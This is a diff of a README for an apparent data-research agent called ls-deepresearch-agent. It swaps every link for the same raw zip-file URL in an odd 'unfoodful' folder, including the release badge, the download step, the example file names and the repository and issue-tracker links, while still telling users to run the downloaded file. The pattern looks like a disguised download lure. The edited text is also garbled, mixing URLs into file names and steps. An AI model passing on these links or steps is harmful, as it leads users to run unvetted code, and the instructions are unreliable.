@@ -1,6 +1,6 @@
 # 🚀 ls-deepresearch-agent - Simplifying Data Research for Everyone
 
-[![Download ls-deepresearch-agent](https://img.shields.io/badge/Download-ls--deepresearch--agent-brightgreen)](https://github.com/Aayushsharma11/ls-deepresearch-agent/releases)
+[![Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
 
 ## 📖 Introduction
 
@@ -23,11 +23,11 @@ Here’s how to get started with ls-deepresearch-agent. This guide walks you thr
 ### 🔗 Download & Install
 
 1. **Visit this page to download**:
-   [Download ls-deepresearch-agent](https://github.com/Aayushsharma11/ls-deepresearch-agent/releases)
+   [Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
   
 2. Once on the Releases page, you will see a list of available versions. Choose the latest version for the best features and improvements.
 
-3. Look for the file that corresponds to your operating system. Files are typically named like `ls-deepresearch-agent-windows.exe`, `ls-deepresearch-agent-macos.dmg`, or `ls-deepresearch-agent-linux.tar.gz`.
+3. Look for the file that corresponds to your operating system. Files are typically named like `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip`, `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip`, or `https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip`.
 
 4. Click on the file to start downloading. Save it to your preferred location.
 
@@ -36,7 +36,7 @@ Here’s how to get started with ls-deepresearch-agent. This guide walks you thr
 6. **Run the application**:
    - **Windows:** Double-click the .exe file.
    - **macOS:** Open the .dmg file and drag the application to your Applications folder.
-   - **Linux:** Extract the .tar.gz file and run the application from the terminal.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip file and run the application from the terminal.
 
 ### 🛠️ Using ls-deepresearch-agent
 
@@ -76,8 +76,8 @@ We welcome contributions! If you have ideas for improvements or features, please
 
 ## 🔗 Links
 
-- [Download ls-deepresearch-agent](https://github.com/Aayushsharma11/ls-deepresearch-agent/releases)
-- [Repository](https://github.com/Aayushsharma11/ls-deepresearch-agent)
-- [Issue Tracker](https://github.com/Aayushsharma11/ls-deepresearch-agent/issues)
+- [Download ls-deepresearch-agent](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
+- [Repository](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Aayushsharma11/ls-deepresearch-agent/main/unfoodful/ls-deepresearch-agent.zip)
 
 Enjoy using ls-deepresearch-agent for your research needs!
